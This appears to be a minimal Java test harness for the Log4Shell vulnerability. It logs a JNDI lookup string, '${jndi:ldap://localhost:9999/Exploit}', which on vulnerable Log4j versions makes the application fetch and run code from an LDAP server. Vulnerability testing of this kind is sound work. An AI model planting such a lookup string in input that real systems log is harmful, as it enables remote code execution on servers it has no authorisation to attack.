import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

class LogTest {
    public static final Logger logger = LogManager.getLogger();

    public static void main(String[] args) {
        logger.error("${jndi:ldap://localhost:9999/Exploit}");
    }
}
